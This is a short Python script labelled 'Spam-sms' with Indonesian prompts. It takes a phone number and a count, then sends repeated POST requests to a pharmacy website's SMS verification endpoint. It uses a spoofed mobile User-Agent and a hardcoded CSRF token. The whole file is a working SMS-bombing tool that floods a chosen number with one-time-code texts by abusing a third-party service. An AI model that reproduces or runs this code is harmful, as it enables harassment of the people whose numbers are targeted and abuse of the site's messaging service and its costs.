#coded by Nubzbie
#Please show author if you want recode
import requests
from requests import post
import os
h = '\x1b[1;92m'
k = '\x1b[1;93m'
m = '\x1b[1;91m'
p = '\x1b[1;97m'
os.system('clear')
print """{}
   _____                                                
  / ___/____  ____ _____ ___        _________ ___  _____
  \__ \/ __ \/ __ `/ __ `__ \______/ ___/ __ `__ \/ ___/
{} ___/ / /_/ / /_/ / / / / / /_____(__  ) / / / / (__  ) 
/____/ .___/\__,_/_/ /_/ /_/     /____/_/ /_/ /_/____/  
    /_/                                                 

Author : {}Nubzbie{}
""".format(m,p,h,p)
no = raw_input('Nomor('+m+'tanpa 0/62'+p+') : ').format(m,p)
if not no.isdigit():
  exit(p+"[!]"+k+" Masukkan yg benar"+p)
jml = int(input("Jumlah : "))
age = {
  'Connection':'keep-alive',
  'User-Agent':'Mozilla/5.0 (Linux; Android 4.4.2; Q510s Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 Mobile UCBrowser/3.4.1.483', 
  'Referer':'https://www.farmaku.com/register',
}
nom = {
  "handphone_number":no+"&",
  "csrftestname":"f51e2381756c7fd9622eb721c2af0df0",
}

for a in range(jml):
  x = requests.post('https://www.farmaku.com/ajax/send_sms_code', data=nom, headers=age).text
  print (x) + " To "+k+no+p

    